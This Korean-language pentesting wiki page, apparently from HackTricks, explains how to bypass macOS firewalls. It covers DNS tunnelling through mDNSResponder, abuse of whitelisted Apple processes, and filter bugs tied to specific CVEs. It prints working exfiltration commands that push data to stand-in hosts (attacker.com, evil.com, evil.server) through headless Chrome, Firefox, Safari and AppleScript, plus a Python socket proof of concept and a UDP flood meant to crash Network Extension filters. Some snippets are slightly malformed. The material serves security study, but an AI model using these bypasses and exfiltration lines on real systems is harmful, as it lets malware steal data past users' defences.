# macOS 방화벽 우회

{{#include ../../banners/hacktricks-training.md}}

## 발견된 기법

다음 기법들은 일부 macOS 방화벽 앱에서 작동하는 것으로 확인되었습니다.

### whitelist names 악용

- 예를 들어 **`launchd`**와 같이 잘 알려진 macOS 프로세스의 이름으로 malware를 실행

### Synthetic Click

- 방화벽이 사용자에게 권한을 요청하는 경우 malware가 **allow를 클릭**하도록 함

### **Apple signed binaries 사용**

- **`curl`**과 같은 바이너리뿐만 아니라 **`whois`**와 같은 다른 바이너리도 사용

### 잘 알려진 Apple 도메인

방화벽이 **`apple.com`** 또는 **`icloud.com`**과 같은 잘 알려진 Apple 도메인에 대한 연결을 허용할 수 있습니다. 또한 iCloud를 C2로 사용할 수도 있습니다.

### Generic Bypass

방화벽을 우회하기 위해 시도해 볼 수 있는 몇 가지 아이디어

### 허용된 트래픽 확인

허용된 트래픽을 파악하면 잠재적으로 whitelist된 도메인이나 해당 도메인에 액세스할 수 있는 애플리케이션을 식별하는 데 도움이 됩니다
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS 악용

macOS에서 process는 **DNS server**와 직접 통신하지 않습니다. Name resolution은 **`mDNSResponder`** (`/usr/sbin/mDNSResponder`)라는 Apple-signed system daemon이 **XPC**를 통해 중개하므로, machine에서 발생하는 모든 lookup은 이를 요청한 process가 아니라 **`mDNSResponder`에서 발생한** traffic으로 host를 빠져나갑니다. 따라서 firewall은 해당 daemon을 무조건 trust하는 경향이 있습니다. 이를 deny하면 전체 system의 name resolution이 중단되기 때문입니다.<sup>[1]</sup>

이 때문에 firewall이 malware 자체의 socket을 block하더라도 DNS는 계속 열려 있는 channel이 됩니다.<sup>[1]</sup>

1. Malware가 `evil.com`에 connect하려고 합니다. 자체 outbound connection은 firewall의 검사 대상이 되어 **block**됩니다.
2. 대신 malware는 XPC를 통해 `mDNSResponder`에 `evil.com`을 **resolve**해 달라고 요청합니다.
3. Firewall은 resulting query를 검사하고, trusted Apple-signed resolver가 originator인 것을 확인한 뒤 **allow**합니다.
4. Query는 DNS server에 도달하며, attacker가 `evil.com`의 authoritative server를 운영한다면 exchange의 양쪽을 모두 control할 수 있습니다.

Attacker가 해당 zone을 소유하므로 "connection"은 전혀 필요하지 않습니다. Data는 **queried labels**(예: `<encoded-chunk>.evil.com`) 내부로 몰래 반출되고, commands는 **answer records**(TXT, A, CNAME…) 내부로 돌아옵니다. 이는 완전히 whitelisted된 process를 이용하는 classic DNS tunnelling입니다.

어떤 unprivileged process든 daemon을 직접 구동할 수 있으므로, 다음과 같이 해당 path가 열려 있는지 쉽게 확인할 수 있습니다:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Browser apps를 통한 방법

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### process injection을 통한

**어떤 server에든 연결할 수 있도록 허용된 process에 code를 inject**할 수 있다면 firewall 보호를 우회할 수 있습니다:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## 최근 macOS firewall bypass 취약점 (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
2024년 7월 Apple은 Screen Time parental controls에서 사용하는 system-wide “Web content filter”를 무력화하는 Safari/WebKit의 critical bug를 patch했습니다.
특수하게 조작된 URI(예: double URL-encoded “://” 포함)는 Screen Time ACL에서는 인식되지 않지만 WebKit에서는 허용되므로, request가 filter되지 않은 상태로 전송됩니다. 따라서 URL을 열 수 있는 모든 process(sandboxed 또는 unsigned code 포함)는 user 또는 MDM profile이 명시적으로 차단한 domain에 접근할 수 있습니다.<sup>[2]</sup>

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### 초기 macOS 14 “Sonoma”의 Packet Filter (PF) rule-ordering bug
macOS 14 beta cycle 동안 Apple은 **`pfctl`** 을 둘러싼 userspace wrapper에 regression을 도입했습니다.
`quick` keyword로 추가된 rules(VPN kill-switch에서 많이 사용됨)가 조용히 무시되어, VPN/firewall GUI에 *blocked*로 표시된 경우에도 traffic leak이 발생했습니다. 이 bug는 여러 VPN vendor에 의해 확인되었으며 RC 2(build 23A344)에서 수정되었습니다.

간단한 leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple-signed helper services 악용 (legacy – macOS 11.2 이전)
macOS 11.2 이전에는 **`ContentFilterExclusionList`**를 통해 **`nsurlsessiond`** 및 App Store와 같은 약 50개의 Apple binaries가 Network Extension framework로 구현된 모든 socket-filter firewalls (LuLu, Little Snitch 등)를 우회할 수 있었습니다.
Malware는 excluded process를 간단히 spawn하거나 해당 process에 code를 inject한 다음, 이미 허용된 socket을 통해 자체 traffic을 tunnel할 수 있었습니다. Apple은 macOS 11.2에서 exclusion list를 완전히 제거했지만, upgrade할 수 없는 systems에서는 여전히 유효한 technique입니다.<sup>[3]</sup>

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH로 Network Extension domain filters 우회하기 (macOS 12+)
NEFilter Packet/Data Providers는 TLS ClientHello SNI/ALPN을 기준으로 동작합니다. **HTTP/3 over QUIC (UDP/443)** 및 **Encrypted Client Hello (ECH)** 를 사용하면 SNI가 암호화된 상태로 유지되어 NetExt가 flow를 파싱할 수 없으며, hostname rules가 fail-open되는 경우가 많습니다. 따라서 malware가 DNS를 건드리지 않고도 차단된 domain에 접속할 수 있습니다.<sup>[5]</sup>

최소 PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
QUIC/ECH가 여전히 활성화되어 있다면 이는 간단한 hostname-filter 우회 경로입니다.

### macOS 15 “Sequoia” Network Extension 불안정성 (2024–2025)
초기 15.0/15.1 빌드는 서드파티 **Network Extension** filter(LuLu, Little Snitch, Defender, SentinelOne 등)를 crash시킵니다. filter가 재시작되면 macOS는 flow rules를 삭제하며, 많은 제품이 fail-open으로 동작합니다. 수천 개의 짧은 UDP flow를 filter에 flooding하거나 QUIC/ECH를 강제로 사용하면 crash를 반복적으로 유발할 수 있으며, GUI에는 여전히 firewall이 실행 중인 것으로 표시되는 동안 C2/exfil을 위한 window가 남을 수 있습니다.<sup>[4]</sup>

간단한 재현(안전한 lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## 최신 macOS를 위한 Tooling 팁

1. GUI firewall이 생성하는 현재 PF rules를 확인합니다:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. 이미 *outgoing-network* entitlement를 보유한 binary를 열거합니다 (piggy-backing에 유용):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift에서 자체 Network Extension content filter를 programmatically 등록합니다.
packet을 local socket으로 전달하는 최소한의 rootless PoC는 Patrick Wardle의 **LuLu** source code에서 확인할 수 있습니다.

## References

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
